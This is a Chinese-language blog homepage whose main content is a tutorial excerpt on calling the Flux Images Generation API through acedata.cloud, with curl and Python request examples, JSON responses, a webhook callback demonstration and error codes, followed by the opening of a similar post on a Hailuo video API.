<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
  <meta name="theme-color" content="#222">
  <meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>
  <script id="hexo-configurations">
    var NexT = window.NexT ||
    {};
    var CONFIG = {
      "hostname": "cuiqingcai.com",
      "root": "/",
      "scheme": "Pisces",
      "version": "7.8.0",
      "exturl": false,
      "sidebar":
      {
        "position": "right",
        "width": 360,
        "display": "post",
        "padding": 18,
        "offset": 12,
        "onmobile": false,
        "widgets": [
          {
            "type": "image",
            "name": "阿布云",
            "enable": false,
            "url": "https://www.abuyun.com/http-proxy/introduce.html",
            "src": "https://cdn.cuiqingcai.com/88au8.jpg",
            "width": "100%"
      },
          {
            "type": "image",
            "name": "爬虫书",
            "url": "https://item.jd.com/13527222.html",
            "src": "https://cdn.cuiqingcai.com/ei5og.jpg",
            "width": "100%",
            "enable": true
      },
          {
            "type": "categories",
            "name": "分类",
            "enable": true
      },
          {
            "type": "image",
            "name": "IPIDEA",
            "url": "http://www.ipidea.net/?utm-source=cqc&utm-keyword=?cqc",
            "src": "https://cdn.cuiqingcai.com/0ywun.png",
            "width": "100%",
            "enable": false
      },
          {
            "type": "image",
            "name": "Storm Proxies",
            "src": "https://cdn.cuiqingcai.com/a2zad8.png",
            "url": "https://www.stormproxies.cn/?keyword=jingmi",
            "width": "100%",
            "enable": false
      },
          {
            "type": "friends",
            "name": "友情链接",
            "enable": true
      },
          {
            "type": "hot",
            "name": "猜你喜欢",
            "enable": true
      },
          {
            "type": "tags",
            "name": "标签云",
            "enable": true
      }]
      },
      "copycode":
      {
        "enable": true,
        "show_result": true,
        "style": "mac"
      },
      "back2top":
      {
        "enable": true,
        "sidebar": false,
        "scrollpercent": true
      },
      "bookmark":
      {
        "enable": false,
        "color": "#222",
        "save": "auto"
      },
      "fancybox": false,
      "mediumzoom": false,
      "lazyload": false,
      "pangu": true,
      "comments":
      {
        "style": "tabs",
        "active": "gitalk",
        "storage": true,
        "lazyload": false,
        "nav": null,
        "activeClass": "gitalk"
      },
      "algolia":
      {
        "hits":
        {
          "per_page": 10
        },
        "labels":
        {
          "input_placeholder": "Search for Posts",
          "hits_empty": "We didn't find any results for the search: ${query}",
          "hits_stats": "${hits} results found in ${time} ms"
        }
      },
      "localsearch":
      {
        "enable": true,
        "trigger": "auto",
        "top_n_per_article": 10,
        "unescape": false,
        "preload": false
      },
      "motion":
      {
        "enable": false,
        "async": false,
        "transition":
        {
          "post_block": "bounceDownIn",
          "post_header": "slideDownIn",
          "post_body": "slideDownIn",
          "coll_header": "slideLeftIn",
          "sidebar": "slideUpIn"
        }
      },
      "path": "search.xml"
    };

  </script>
  <meta name="keywords" content="爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书,静觅,崔庆才">
  <meta name="robots" content="index,follow">
  <meta name="GOOGLEBOT" content="index,follow">
  <meta name="author" content="静觅丨崔庆才的个人站点">
  <meta name="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
  <meta property="og:type" content="website">
  <meta property="og:title" content="静觅">
  <meta property="og:url" content="https://cuiqingcai.com/index.html">
  <meta property="og:site_name" content="静觅">
  <meta property="og:description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
  <meta property="og:locale" content="zh_CN">
  <meta property="article:author" content="崔庆才">
  <meta property="article:tag" content="爬虫教程">
  <meta property="article:tag" content="爬虫">
  <meta property="article:tag" content="Python">
  <meta property="article:tag" content="Python爬虫">
  <meta property="article:tag" content="Python爬虫教程">
  <meta property="article:tag" content="爬虫书">
  <meta property="article:tag" content="静觅">
  <meta property="article:tag" content="崔庆才">
  <meta name="twitter:card" content="summary">
  <link rel="canonical" href="https://cuiqingcai.com/">
  <script id="page-configurations">
    // https://hexo.io/docs/variables.html
    CONFIG.page = {
      sidebar: "",
      isHome: true,
      isPost: false,
      lang: 'zh-CN'
    };

  </script>
  <title>静觅丨崔庆才的个人站点 - Python爬虫教程</title>
  <meta name="google-site-verification" content="p_bIcnvirkFzG2dYKuNDivKD8-STet5W7D-01woA2fc" />
  <meta name="sogou_site_verification" content="kBOV53NQqT" />
  <noscript>
    <style>
      .use-motion .brand,
      .use-motion .menu-item,
      .sidebar-inner,
      .use-motion .post-block,
      .use-motion .pagination,
      .use-motion .comments,
      .use-motion .post-header,
      .use-motion .post-body,
      .use-motion .collection-header
      {
        opacity: initial;
      }

      .use-motion .site-title,
      .use-motion .site-subtitle
      {
        opacity: initial;
        top: initial;
      }

      .use-motion .logo-line-before i
      {
        left: initial;
      }

      .use-motion .logo-line-after i
      {
        right: initial;
      }

    </style>
  </noscript>
  <link rel="alternate" href="/atom.xml" title="静觅" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container">
    <div class="headband"></div>
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner">
        <div class="site-brand-container">
          <div class="site-nav-toggle">
            <div class="toggle" aria-label="切换导航栏">
              <span class="toggle-line toggle-line-first"></span>
              <span class="toggle-line toggle-line-middle"></span>
              <span class="toggle-line toggle-line-last"></span>
            </div>
          </div>
          <div class="site-meta">
            <a href="/" class="brand" rel="start">
              <span class="logo-line-before"><i></i></span>
              <h1 class="site-title">静觅 <span class="site-subtitle"> 崔庆才的个人站点 - Python爬虫教程 </span>
              </h1>
              <span class="logo-line-after"><i></i></span>
            </a>
          </div>
          <div class="site-nav-right">
            <div class="toggle popup-trigger">
              <i class="fa fa-search fa-fw fa-lg"></i>
            </div>
          </div>
        </div>
        <nav class="site-nav">
          <ul id="menu" class="main-menu menu">
            <li class="menu-item menu-item-home">
              <a href="/" rel="section">首页</a>
            </li>
            <li class="menu-item menu-item-archives">
              <a href="/archives/" rel="section">文章列表</a>
            </li>
            <li class="menu-item menu-item-tags">
              <a href="/tags/" rel="section">文章标签</a>
            </li>
            <li class="menu-item menu-item-categories">
              <a href="/categories/" rel="section">文章分类</a>
            </li>
            <li class="menu-item menu-item-about">
              <a href="/about/" rel="section">关于博主</a>
            </li>
            <li class="menu-item menu-item-message">
              <a href="/message/" rel="section">给我留言</a>
            </li>
            <li class="menu-item menu-item-search">
              <a role="button" class="popup-trigger">搜索 </a>
            </li>
          </ul>
        </nav>
        <div class="search-pop-overlay">
          <div class="popup search-popup">
            <div class="search-header">
              <span class="search-icon">
                <i class="fa fa-search"></i>
              </span>
              <div class="search-input-container">
                <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
              </div>
              <span class="popup-btn-close">
                <i class="fa fa-times-circle"></i>
              </span>
            </div>
            <div id="search-result">
              <div id="no-result">
                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
              </div>
            </div>
          </div>
        </div>
      </div>
    </header>
    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
      <span>0%</span>
    </div>
    <div class="reading-progress-bar"></div>
    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div class="content index posts-expand">
            <div class="carousel">
              <div id="wowslider-container">
                <div class="ws_images">
                  <ul>
                    <li><a target="_blank" href="https://item.jd.com/13527222.html"><img title="Python3网络爬虫开发实战（第二版）上市了！" src="https://cdn.cuiqingcai.com/prwgs.png" /></a></li>
                    <li><a target="_blank" href="https://t.lagou.com/fRCBRsRCSN6FA"><img title="52讲轻松搞定网络爬虫" src="https://cdn.cuiqingcai.com/fqq5e.png" /></a></li>
                    <li><a target="_blank" href="https://cuiqingcai.com/4320.html"><img title="Python3网络爬虫开发视频教程" src="https://cdn.cuiqingcai.com/bjrny.jpg" /></a></li>
                    <li><a target="_blank" href="https://cuiqingcai.com/5094.html"><img title="爬虫代理哪家强？十大付费代理详细对比评测出炉！" src="https://cdn.cuiqingcai.com/nifs6.jpg" /></a></li>
                  </ul>
                </div>
                <div class="ws_thumbs">
                  <div>
                    <a target="_blank" href="#"><img src="https://cdn.cuiqingcai.com/prwgs.png" /></a>
                    <a target="_blank" href="#"><img src="https://cdn.cuiqingcai.com/fqq5e.png" /></a>
                    <a target="_blank" href="#"><img src="https://cdn.cuiqingcai.com/bjrny.jpg" /></a>
                    <a target="_blank" href="#"><img src="https://cdn.cuiqingcai.com/nifs6.jpg" /></a>
                  </div>
                </div>
                <div class="ws_shadow"></div>
              </div>
            </div>
            <link rel="stylesheet" href="/lib/wowslide/slide.css">
            <script src="/lib/wowslide/jquery.min.js"></script>
            <script src="/lib/wowslide/slider.js"></script>
            <script>
              jQuery("#wowslider-container").wowSlider(
              {
                effect: "cube",
                prev: "",
                next: "",
                duration: 20 * 100,
                delay: 100 * 100,
                width: 716,
                height: 297,
                autoPlay: true,
                playPause: true,
                stopOnHover: false,
                loop: false,
                bullets: 0,
                caption: true,
                captionEffect: "slide",
                controls: true,
                onBeforeStep: 0,
                images: 0
              });

            </script>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42375.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> API <i class="label-arrow"></i>
                  </a>
                  <a href="/42375.html" class="post-title-link" itemprop="url">Flux Images Generation API 对接说明</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>本文将介绍一种 Flux Images Generation API 对接说明，它是可以通过输入自定义参数来生成Flux官方的图片。</p>
                  <p>接下来介绍下 Flux Images Generation API 的对接说明。</p>
                  <h2 id="申请流程"><a href="#申请流程" class="headerlink" title="申请流程"></a>申请流程</h2>
                  <p>要使用 API，需要先到 <a href="https://platform.acedata.cloud/documents/6b9197c5-7a3f-4878-a43f-7f94e7e66394" target="_blank" rel="noopener">Flux Images Generation API</a> 对应页面申请对应的服务，进入页面之后，点击「Acquire」按钮，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/q6ytrc.png" alt=""></p>
                  <p>如果你尚未登录或注册，会自动跳转到登录页面邀请您来注册和登录，登录注册之后会自动返回当前页面。</p>
                  <p>在首次申请时会有免费额度赠送，可以免费使用该 API。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
                  <p>首先先了解下基本的使用方式，就是输入提示词 <code>prompt</code>、 生成行为 <code>action</code>、图片尺寸 <code>size</code>，便可获得处理后的结果，首先需要简单地传递一个 <code>action</code> 字段，它的值为 <code>generate</code>，然后我们还需要输入提示词，具体的内容如下：</p>
                  <p><img src="https://cdn.acedata.cloud/wz85jt.png" width="500" class="m-auto"></p>
                  <p>可以看到这里我们设置了 Request Headers，包括：</p>
                  <ul>
                    <li><code>accept</code>：想要接收怎样格式的响应结果，这里填写为 <code>application/json</code>，即 JSON 格式。</li>
                    <li><code>authorization</code>：调用 API 的密钥，申请之后可以直接下拉选择。</li>
                  </ul>
                  <p>另外设置了 Request Body，包括：</p>
                  <ul>
                    <li><code>action</code>：此次图片生成任务的行为。</li>
                    <li><code>size</code>：图片生成结果的尺寸大小。</li>
                    <li><code>count</code>：生成图片的数量，默认值是1，该参数只有在生成图片任务有效，编辑任务是无效的。</li>
                    <li><code>prompt</code>：提示词。</li>
                    <li><code>callback_url</code>：需要回调结果的URL。</li>
                  </ul>
                  <p>选择之后，可以发现右侧也生成了对应代码，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/8q7aux.png" width="500" class="m-auto"></p>
                  <p>点击「Try」按钮即可进行测试，如上图所示，这里我们就得到了如下结果：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"226eb763-9eab-4d06-ad57-d59753a03307"</span>,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"089f8b46-0167-4f25-88ee-3c3f88d80e84"</span>,</span><br><span class="line">  <span class="attr">"data"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"prompt"</span>: <span class="string">"a white siamese cat"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://fal.media/files/lion/NVhtlwwGYQD6HrGaEfrzu_341484fad6d84b21b73f4f8824a3f98a.png"</span>,</span><br><span class="line">      <span class="attr">"timings"</span>: <span class="number">1752743801</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"prompt"</span>: <span class="string">"a white siamese cat"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://fal.media/files/monkey/8UEQpFbQCYVOK1wKP3aV0_9bbc26fad64049b18d0244b99ef66ad1.png"</span>,</span><br><span class="line">      <span class="attr">"timings"</span>: <span class="number">1752743801</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>返回结果一共有多个字段，介绍如下：</p>
                  <ul>
                    <li><code>success</code>，此时视频生成任务的状态情况。</li>
                    <li><code>task_id</code>，此时视频生成任务ID。</li>
                    <li><code>trace_id</code>，此时视频生成跟踪ID。</li>
                    <li><code>data</code>，此时图像生成任务的结果列表。<ul>
                        <li><code>image_url</code>，此时图片生成任务的链接。</li>
                        <li><code>prompt</code>，提示词。</li>
                      </ul>
                    </li>
                  </ul>
                  <p>可以看到我们得到了满意的图片信息，我们只需要根据结果中 <code>data</code> 的图片链接地址获取生成的Flux图片即可。</p>
                  <p>另外如果想生成对应的对接代码，可以直接复制生成，例如 CURL 的代码如下：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/flux/images' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "action": "generate",</span><br><span class="line">  "prompt": "a white siamese cat",</span><br><span class="line">  "model": "flux-kontext-pro",</span><br><span class="line">  "count": 2</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="编辑图片任务"><a href="#编辑图片任务" class="headerlink" title="编辑图片任务"></a>编辑图片任务</h2>
                  <p>如果想对某张图片进行编辑的话， 首先参数<code>image_url</code>必须传入需要编辑的图片链接，此时 <code>action</code> 只支持 <code>edits</code>，就可以指定如下内容：</p>
                  <ul>
                    <li>model：此次编辑图片任务所采用的模型，该任务目前支持 <code>flux-kontext-max</code>、 <code>flux-kontext-pro</code>。</li>
                    <li>image_url：上传需要编辑的图片。</li>
                  </ul>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/jn9da5.png" width="500" class="m-auto"></p>
                  <p>填写完毕之后自动生成了代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/6cwxb8.png" width="500" class="m-auto"></p>
                  <p>对应的代码：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://api.acedata.cloud/flux/images"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"accept"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">    <span class="string">"authorization"</span>: <span class="string">"Bearer &#123;token&#125;"</span>,</span><br><span class="line">    <span class="string">"content-type"</span>: <span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"action"</span>: <span class="string">"edits"</span>,</span><br><span class="line">    <span class="string">"prompt"</span>: <span class="string">"a white siamese cat"</span>,</span><br><span class="line">    <span class="string">"model"</span>: <span class="string">"flux-kontext-pro"</span>,</span><br><span class="line">    <span class="string">"image_url"</span>: <span class="string">"https://cdn.acedata.cloud/ytj2qy.png"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=payload, headers=headers)</span><br><span class="line">print(response.text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>点击运行，可以发现会立即得到一个结果，如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"2a7979ff-1f77-4380-92c6-a2dc37c3b4c8"</span>,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"732b65c0-48d9-49f7-b568-64e5acffe4c0"</span>,</span><br><span class="line">  <span class="attr">"data"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"prompt"</span>: <span class="string">"a white siamese cat"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://fal.media/files/monkey/aEUXJZ6Faj9YXUCQVs01Q_af0cea56c558441c9ba8df67b200812d.png"</span>,</span><br><span class="line">      <span class="attr">"timings"</span>: <span class="number">1752744073</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，生成的效果是对原图片进行编辑的效果，结果与上文类似。</p>
                  <h2 id="异步回调"><a href="#异步回调" class="headerlink" title="异步回调"></a>异步回调</h2>
                  <p>由于 Flux Images Generation API 生成的时间相对较长，大约需要 1-2 分钟，如果 API 长时间无响应，HTTP 请求会一直保持连接，导致额外的系统资源消耗，所以本 API 也提供了异步回调的支持。</p>
                  <p>整体流程是：客户端发起请求的时候，额外指定一个 <code>callback_url</code> 字段，客户端发起 API 请求之后，API 会立马返回一个结果，包含一个 <code>task_id</code> 的字段信息，代表当前的任务 ID。当任务完成之后，生成图片的结果会通过 POST JSON 的形式发送到客户端指定的 <code>callback_url</code>，其中也包括了 <code>task_id</code> 字段，这样任务结果就可以通过 ID 关联起来了。</p>
                  <p>下面我们通过示例来了解下具体怎样操作。</p>
                  <p>首先，Webhook 回调是一个可以接收 HTTP 请求的服务，开发者应该替换为自己搭建的 HTTP 服务器的 URL。此处为了方便演示，使用一个公开的 Webhook 样例网站 <a href="https://webhook.site/，打开该网站即可得到一个" target="_blank" rel="noopener">https://webhook.site/，打开该网站即可得到一个</a> Webhook URL，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/cjjfly.png" alt=""></p>
                  <p>将此 URL 复制下来，就可以作为 Webhook 来使用，此处的样例为 <code>https://webhook.site/3d32690d-6780-4187-a65c-870061e8c8ab</code>。</p>
                  <p>接下来，我们可以设置字段 <code>callback_url</code> 为上述 Webhook URL，同时填入相应的参数，具体的内容如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/wm6caw.png" width="500" class="m-auto"></p>
                  <p>点击运行，可以发现会立即得到一个结果，如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"6a97bf49-df50-4129-9e46-119aa9fca73c"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>稍等片刻，我们可以在 <code>https://webhook.site/3d32690d-6780-4187-a65c-870061e8c8ab</code> 上观察到生成图片的结果，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/v23lot.png" alt=""></p>
                  <p>内容如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"task_id"</span>: <span class="string">"6a97bf49-df50-4129-9e46-119aa9fca73c"</span>,</span><br><span class="line">    <span class="attr">"trace_id"</span>: <span class="string">"9b4b1ff3-90f2-470f-b082-1061ec2948cc"</span>,</span><br><span class="line">    <span class="attr">"data"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"prompt"</span>: <span class="string">"a white siamese cat"</span>,</span><br><span class="line">            <span class="attr">"image_url"</span>: <span class="string">"https://sf-maas-uat-prod.oss-cn-shanghai.aliyuncs.com/outputs/f4f8d407-377a-408a-82d0-427a5a836f09_0.png"</span>,</span><br><span class="line">            <span class="attr">"seed"</span>: <span class="number">1698551532</span>,</span><br><span class="line">            <span class="attr">"timings"</span>: &#123;</span><br><span class="line">                <span class="attr">"inference"</span>: <span class="number">3.328</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到结果中有一个 <code>task_id</code> 字段，其他的字段都和上文类似，通过该字段即可实现任务的关联。</p>
                  <h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2>
                  <p>在调用 API 时，如果遇到错误，API 会返回相应的错误代码和信息。例如：</p>
                  <ul>
                    <li><code>400 token_mismatched</code>：Bad request, possibly due to missing or invalid parameters.</li>
                    <li><code>400 api_not_implemented</code>：Bad request, possibly due to missing or invalid parameters.</li>
                    <li><code>401 invalid_token</code>：Unauthorized, invalid or missing authorization token.</li>
                    <li><code>429 too_many_requests</code>：Too many requests, you have exceeded the rate limit.</li>
                    <li><code>500 api_error</code>：Internal server error, something went wrong on the server.</li>
                  </ul>
                  <h3 id="错误响应示例"><a href="#错误响应示例" class="headerlink" title="错误响应示例"></a>错误响应示例</h3>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"error"</span>: &#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"api_error"</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">"fetch failed"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"2cf86e86-22a4-46e1-ac2f-032c0f2a4e89"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2>
                  <p>通过本文档，您已经了解了如何使用 Flux Images Generation API 可通过输入提示词来生成图片。希望本文档能帮助您更好地对接和使用该 API。如有任何问题，请随时联系我们的技术支持团队。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2025-08-11 23:01:22 / 修改时间：23:24:05" itemprop="dateCreated datePublished" datetime="2025-08-11T23:01:22+08:00">2025-08-11</time>
                </span>
                <span id="/42375.html" class="post-meta-item leancloud_visitors" data-flag-title="Flux Images Generation API 对接说明" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>4.4k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>4 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42374.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> API <i class="label-arrow"></i>
                  </a>
                  <a href="/42374.html" class="post-title-link" itemprop="url">Hailuo Videos Generation API 对接说明</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>本文将介绍一种 Hailuo Videos Generation API 对接说明，它是可以通过输入自定义参数来生成Hailuo官方的视频。</p>
                  <p>接下来介绍下 Hailuo Videos Generation API 的对接说明。</p>
                  <h2 id="申请流程"><a href="#申请流程" class="headerlink" title="申请流程"></a>申请流程</h2>
                  <p>要使用 API，需要先到 <a href="https://platform.acedata.cloud/documents/ee06377b-9185-438f-ac84-3376bcb1275e" target="_blank" rel="noopener">Hailuo Videos Generation API</a> 对应页面申请对应的服务，进入页面之后，点击「Acquire」按钮，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/q6ytrc.png" alt=""></p>
                  <p>如果你尚未登录或注册，会自动跳转到登录页面邀请您来注册和登录，登录注册之后会自动返回当前页面。</p>
                  <p>在首次申请时会有免费额度赠送，可以免费使用该 API。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
